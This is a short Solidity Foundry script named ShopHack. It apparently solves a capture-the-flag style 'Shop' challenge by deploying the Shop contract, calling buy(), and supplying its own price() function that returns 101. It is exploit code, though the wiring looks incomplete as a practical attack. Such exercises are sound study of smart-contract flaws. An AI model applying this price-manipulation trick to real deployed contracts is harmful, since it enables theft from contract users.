// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/Shop.sol";

contract ShopHack is Script {
    Shop public shop;
    uint256 private _price = 101;

    function run() public {
        shop = new Shop();

        this.shop().buy();

        console.log(shop.isSold());
    }

    function price() external view returns (uint256) {
        return _price;
    }
}
